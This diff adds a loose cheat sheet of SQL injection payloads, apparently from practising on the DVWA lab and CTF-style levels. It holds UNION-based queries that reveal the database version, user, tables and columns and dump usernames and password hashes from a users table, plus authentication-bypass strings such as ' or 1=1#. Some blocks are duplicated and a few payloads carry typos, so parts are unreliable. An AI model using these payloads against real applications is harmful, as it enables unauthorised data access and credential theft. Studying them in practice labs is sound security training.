@@ -1,0 +1,87 @@
+
+ union select null,table_name from information_schema.tables where table_cschema = 'noswap' 
+	%' or '0'='0
+find all true records
+________________
+
+	%' or 0=0 union select null, version() #
+find db version
+______
+	
+	%' or 0=0 union select null, user() #
+find db user
+root@localhost
+
+______________-
+
+	%' or 0=0 union select null, database()#
+find db name
+ dvwa
+
+________
+display all tables in database schema
+%' and 1=0 union select null, table_name from information_schema.tables#
+
+______________
+column names
+
+
+%' and 1=0 union, select null, concat(table_name, 0xa, column name) from information_schema.columns where table_name = 'users'#
+ 
+___________
+table data
+
+%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#
+
+ ___________Sql Injection
+
+	%' or '0'='0
+find all true records
+________________
+
+	%' or 0=0 union select null, version() #
+find db version
+______
+	
+	%' or 0=0 union select null, user() #
+find db user
+root@localhost
+
+______________-
+
+	%' or 0=0 union select null, database()#
+find db name
+ dvwa
+
+________
+display all tables in database schema
+%' and 1=0 union select null, table_name from information_schema.tables#
+
+______________
+column names
+
+
+%' and 1=0 union, select null, concat(table_name, 0xa, column name) from information_schema.columns where table_name = 'users'#
+
+%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#
+
+'  -single quote
+' or 1=1 --  -comment mysql two hyphens and a space returns the first record
+' or (1=1 and username = 'jeremy') -- pick a user name
+
+''or'1'='1'
+
+1','1,NULL)--  #
+' or 1=1#
+email=' || email LIKE '%';#
+
+username: name" OR "1"="1
+password: pass" OR "1"="1
+scp level08@192.168.0.108:/home/flag08/capture.pcap .   
+_______________mysql from command line
+echo "SELECT hostname from sensor;" | mysql -u root -p snort
+
+
+
+
+ 
